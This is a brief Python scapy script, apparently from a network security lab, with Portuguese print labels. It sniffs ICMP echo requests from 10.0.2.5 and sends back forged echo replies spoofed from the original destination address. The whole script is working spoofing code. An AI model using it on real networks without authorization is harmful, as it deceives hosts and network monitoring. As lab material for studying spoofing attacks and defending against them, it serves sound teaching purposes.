from scapy.all import *

def spoof_pkt(pkt):
	if ICMP in pkt and pkt[ICMP].type ==8:
		print("Pacote Original: ")
		print("IP Origem: ", pkt[IP].src)
		print("IP Destino: ", pkt[IP].dst)

		ip=IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
		icmp = ICMP(type = 0, id=pkt[ICMP].id,seq=pkt[ICMP].seq)
		data = pkt[Raw].load
		newpkt = ip/icmp/data

		print("Pacote Spoofed: ")
		print("IP Origem: ", newpkt[IP].src)
		print("IP Destino: ", newpkt[IP].dst)
		send(newpkt,verbose=0)

pkt = sniff(filter='icmp and src host 10.0.2.5',prn=spoof_pkt)